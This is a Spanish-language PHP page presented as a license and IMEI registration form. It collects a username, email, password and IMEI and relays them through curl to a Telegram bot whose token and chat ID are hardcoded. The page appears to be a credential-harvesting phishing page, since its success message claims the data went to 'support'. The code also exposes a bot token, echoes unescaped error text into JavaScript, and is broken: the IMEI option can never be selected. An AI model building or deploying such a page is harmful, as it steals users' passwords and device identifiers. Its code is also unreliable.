<?php
// ======================
// ⚡ CONFIGURACIÓN ⚡
// ======================
$bot_token = "7618106422:AAHcUcPcdlfxoRO83vErlf1rguf0xIzM1rM"; // Tu token
$chat_id   = "6726478431"; // Personal o grupo

if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    $usuario   = trim($_POST['usuario'] ?? '');
    $correo    = trim($_POST['correo'] ?? '');
    $clave     = trim($_POST['clave'] ?? '');
    $tipo      = trim($_POST['tipo'] ?? '');
    $imei      = trim($_POST['imei'] ?? '');

    // Validar IMEI solo si es teléfono
    if ($tipo === 'telefono' && !preg_match('/^\d{15}$/', $imei)) {
        $error = "El IMEI debe tener exactamente 15 dígitos.";
    }

    if (!isset($error)) {
        // Construir mensaje
        $mensaje = "📌 <b>Nuevo registro de licencia</b>\n\n";
        $mensaje .= "👤 Usuario: $usuario\n";
        $mensaje .= "📧 Correo: $correo\n";
        $mensaje .= "🔒 Contraseña de la licencia: $clave\n";
        $mensaje .= "💻 Tipo de dispositivo: " . ucfirst($tipo) . "\n";
        if($tipo === 'telefono') {
            $mensaje .= "📱 IMEI: $imei\n";
        }
        $mensaje .= "📅 Fecha: " . date("d/m/Y H:i");

        // Enviar mensaje a Telegram
        $url = "https://api.telegram.org/bot$bot_token/sendMessage";
        $post_fields = [
            'chat_id' => $chat_id,
            'text' => $mensaje,
            'parse_mode' => 'HTML'
        ];

        $ch = curl_init(); 
        curl_setopt($ch, CURLOPT_URL, $url); 
        curl_setopt($ch, CURLOPT_POST, true); 
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields); 
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); 
        $result = curl_exec($ch); 
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $curl_error = curl_error($ch);
        curl_close($ch);

        if ($curl_error || $http_code != 200) {
            $error = "Error enviando a Telegram: $curl_error, Código HTTP: $http_code";
        } else {
            $success = true;
        }
    }
}
?>

<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<title>Enviar Licencia & IMEI </title>
<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
<style>
body{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif; background: linear-gradient(135deg,#74ebd5,#ACB6E5); display:flex; justify-content:center; align-items:center; min-height:100vh; margin:0; padding:20px;}
.contenedor{background:#fff; width:100%; max-width:500px; padding:40px 35px; border-radius:15px; box-shadow:0 12px 30px rgba(0,0,0,0.15);}
h2{text-align:center; color:#333; margin-bottom:25px; font-size:1.8rem;}
label{font-weight:600; color:#555; margin-top:10px; display:block;}
input, select{width:95%; padding:14px 16px; margin:12px 0; border-radius:10px; border:1px solid #ccc; font-size:1rem;}
input:disabled{background:#eee;}
button{width:100%; background:linear-gradient(135deg, #4e54c8,#8f94fb); color:#fff; padding:16px; border:none; border-radius:12px; font-size:1.15rem; font-weight:bold; cursor:pointer; margin-top:20px; box-shadow:0 5px 18px rgba(0,0,0,0.2); transition:all 0.3s ease;}
button:hover{background:linear-gradient(135deg,#6a63f7,#a1a0ff); transform:translateY(-2px) scale(1.02); box-shadow:0 8px 25px rgba(0,0,0,0.25);}
</style>
</head>
<body>

<div class="contenedor">
<h2>📤 Enviar Licencia & IMEI</h2>

<form method="POST">
    <label>Usuario</label>
    <input type="text" name="usuario" placeholder="Nombre del usuario" required>

    <label>Correo electrónico</label>
    <input type="email" name="correo" placeholder="usuario@email.com" required>

    <label>Contraseña</label>
    <input type="text" name="clave" placeholder="Contraseña de la licencia" required>

    <label>Tipo de dispositivo</label>
    <select name="tipo" id="tipo" onchange="toggleIMEI()" required>
        <option value="">Seleccione...</option>
        <option value="Licencia">Licencia</option>
        <option value="Imei">Imei</option>
    </select>

    <label>IMEI (solo si es teléfono)</label>
    <input type="text" name="imei" id="imei" placeholder="Ej: 123456789012345" maxlength="15" disabled pattern="\d{15}">

    <button type="submit">📨 Enviar</button>
</form>
</div>

<script>
function toggleIMEI() {
    const tipo = document.getElementById('tipo').value;
    const imei = document.getElementById('imei');
    if(tipo === 'telefono') {
        imei.disabled = false;
        imei.required = true;
    } else {
        imei.disabled = true;
        imei.required = false;
        imei.value = '';
    }
}
<?php if(isset($error)): ?>
Swal.fire({title: '❌ Error', text: '<?php echo $error; ?>', icon: 'error', confirmButtonText: 'Aceptar'});
<?php elseif(isset($success)): ?>
Swal.fire({title: '✅ Enviado', text: 'La información se ha enviado correctamente al soporte.', icon: 'success', confirmButtonText: 'Aceptar'});
<?php endif; ?>
</script>

</body>
</html>
